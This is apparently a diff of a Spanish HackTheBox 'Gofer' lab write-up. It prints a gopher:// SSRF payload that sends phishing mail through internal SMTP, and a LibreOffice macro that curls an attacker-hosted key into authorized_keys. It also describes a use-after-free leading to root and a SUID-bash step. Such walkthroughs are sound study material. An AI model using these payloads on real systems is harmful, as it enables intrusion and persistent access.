@@ -1,4 +1,4 @@
-I"[�
+I"��
 <h2 id="enumeracion">Enumeracion</h2>
 
 <p>Iniciamos con un escaneo de nmap con:</p>
@@ -121,9 +121,9 @@ PD: Una última cosa para Tom; sé que estás trabajando en nuestro proxy web, p
   </li>
 </ol>
 
-<p>Asi que tenemos una interaccion del usuario al dale clicks a enlaces, que los correos usan .odt para que los interprete LibreOficce, y que se usa un proxy web que es Gopher</p>
+<p>Asi que tenemos una interaccion del usuario al dale clicks a enlaces, que los correos usan .odt para que los interprete LibreOficce</p>
 
-<p><strong>Extra:</strong> Solamente con ver el nombre de <strong>Gofer</strong> por todos lados hasta en el nombre de la maquina, me puedo dar una idea de que la maquina este usando el protocolo <strong>Gopher</strong>, y ese mismo protocolo se ha explotado en otras maquina usando <strong>SSRF</strong>, asi que hay cosillas jiji</p>
+<p><strong>Extra:</strong> Solamente con ver el nombre de <strong>Gofer</strong> por todos lados hasta en el nombre de la maquina, me puedo dar una idea de que la maquina este usando el protocolo <strong>Gopher</strong>, y ese mismo protocolo se ha explotado en otras maquinas usando <strong>SSRF</strong>, asi que hay cosillas jiji</p>
 
 <p>Si analizamos la parte de encabezados:</p>
 
@@ -181,7 +181,7 @@ Upgrade-Insecure-Requests: 1
 Authorization: Basic YWRtaW46YWRtaW4=
 </span></code></pre></div></div>
 
-<p>Solamente podemos ver que hace una peticion por GET y poco mas, como curiosidad, el encabezado de <strong>Auhorization</strong> nos dice que tipo de autenticacion esta usando, que en esta caso es <strong>HTTP Basic Authentication</strong> y la cadena en b64 son las credenciales que proporcione, y del lado de la respuesta solo es un 401.</p>
+<p>Solamente podemos ver que hace una peticion por GET y poco mas, como curiosidad, el encabezado de <strong>Auhorization</strong> nos dice que tipo de autenticacion que esta usando, en esta caso es <strong>HTTP Basic Authentication</strong> y la cadena en b64 son las credenciales que proporcione, y del lado de la respuesta solo es un 401.</p>
 
 <p>Aqui se me ocurrio volver a hacer fuzzing de directorios pero en <strong>proxy.gofer.htb</strong> y no encontre nada</p>
 
@@ -226,9 +226,9 @@ Authorization: Basic YWRtaW46YWRtaW4=
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gopher://0x7f000001:25/_HELO gofer.htb%0AMAIL FROM: &lt;jdavis@gofer.htb&gt;%0ARCPT TO: &lt;jhudson@gofer.htb&gt;%0ADATA%0ASubject: &lt;a http://10.10.14.59:8086/prueba&gt; SSRF HERE%0ASSRF AND SMTP%0A.
 </code></pre></div></div>
 
-<p>Y lo que estaria pasando es que mediante el <strong>SSRF</strong> estamos accediendo al servicio interno de <strong>SMTP</strong> para enviar un correo a la <strong>Jocelyn</strong>, y como sabemos que la <strong>Jocelyn</strong> da click en los enlaces, en el <strong>Subject</strong> agregamos nuestra IP con un archivo de prueba que sera solicitado.</p>
+<p>Y lo que estaria pasando es que mediante el <strong>SSRF</strong> estamos accediendo al servicio interno de <strong>SMTP</strong> para enviar un correo a la <strong>Jocelyn</strong>, y como sabemos que la <strong>Jocelyn</strong> da click en los enlaces, en el <strong>Subject</strong> agregamos nuestra IP con un archivo de <strong>/prueba</strong> que sera solicitado.</p>
 
-<p>Y observa como nos llego una peticion que viene de la maquina</p>
+<p>Y observa como nos llego una peticion que viene de la maquina hacía el recurso /prueba</p>
 
 <p><img src="/assets/img/gofer/8.png" alt="" /></p>
 
@@ -242,6 +242,8 @@ Authorization: Basic YWRtaW46YWRtaW4=
     <span class="n">Shell</span><span class="p">(</span><span class="s">"curl &lt;tu_ip&gt;:8086/id_rsa.pub -o /home/jhudson/.ssh/authorized_keys"</span><span class="p">)</span>
 <span class="k">End</span> <span class="k">Sub</span>
 </code></pre></div></div>
+
+<p>Simplemente modificamos el exploit que usamos anteriormente y en lugar de que se solicité <strong>/prueba</strong>, se solicitará ese .odt malicioso (/shell.odt, por ejemplo)</p>
 
 <p>Pasando un momento, nos llegara una peticion a nuestro servidor web de python solicitando el archivo .odt, y ahora ya podemos acceder como <strong>jhudson</strong> por SSH, por que nuestro <strong>id_rsa.pub</strong> se hizo el <strong>authorized_keys</strong> de <strong>jhudson</strong></p>
 
@@ -394,7 +396,7 @@ Authorization: Basic YWRtaW46YWRtaW4=
     <span class="p">}</span>
 <span class="k">break</span><span class="p">;</span>
 </code></pre></div></div>
-<p>Primero se valida que <strong>local_10</strong> no tenga 0, y en caso de que no, osea que tenga memoria asignada, hace un free de <strong>local_10</strong> y entonces ese espacio en memoria se marca como libre para otras asignaciones, el problema es que no hace nada mas, osea que no restablece para que apunte de <strong>NULL</strong>, y entonces <strong>local_10</strong> aun apunta a esa memoria</p>
+<p>Primero se valida que <strong>local_10</strong> no tenga 0, y en caso de que no, osea que tenga memoria asignada, hace un free de <strong>local_10</strong> y entonces ese chunk se marca como libre para otras asignaciones, el problema es que no hace nada mas, osea que <strong>local_10</strong> no  se restablece para que apunte de <strong>NULL</strong>, y entonces <strong>local_10</strong> aun apunta a ese chunk</p>
 
 <ul>
   <li><strong>Problema 2:</strong></li>
@@ -408,7 +410,7 @@ Authorization: Basic YWRtaW46YWRtaW4=
     <span class="p">}</span>
 </code></pre></div></div>
 
-<p>En el case 4 se asigna otro chunk y lo guarda en <strong>local_18</strong>, pero debido a lo analziado en el problema 1, en realidad <strong>local_10</strong> y <strong>local_18</strong> apuntarian al mismo chunk, entonces nosotros podriamos esbrirbir tantos byes para sobreescribir <strong>local_10</strong></p>
+<p>En el case 4 se asigna otro chunk y lo guarda en <strong>local_18</strong>, pero debido a lo analizado en el problema 1, en realidad <strong>local_10</strong> y <strong>local_18</strong> apuntarian al mismo chunk, entonces nosotros podriamos esbrirbir tantos byes para sobreescribir <strong>local_10</strong></p>
 
 <ul>
   <li><strong>Case 8:</strong></li>
@@ -459,7 +461,7 @@ Authorization: Basic YWRtaW46YWRtaW4=
 
 <p>Y por ultimo me pondre en escucha desde otra terminal y volvere a ejecutar el binario <strong>notes</strong> para hacerme admin y ejecutar el case 8</p>
 
-<p>Oberva como nos llego una shell como root:</p>
+<p>Oberva como nos llego una shell como root y del lado derecho nos dice <strong>Acess granted</strong>:</p>
 
 <p><img src="/assets/img/gofer/14.png" alt="" /></p>
 
@@ -468,6 +470,8 @@ Authorization: Basic YWRtaW46YWRtaW4=
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
 <span class="nb">chmod </span>u+s /bin/bash
 </code></pre></div></div>
+<p>Y despues ejectuar un <strong>bash -p</strong></p>
 
 <p>Eso ha sido todo, gracias por leer ❤</p>
+
 :ET
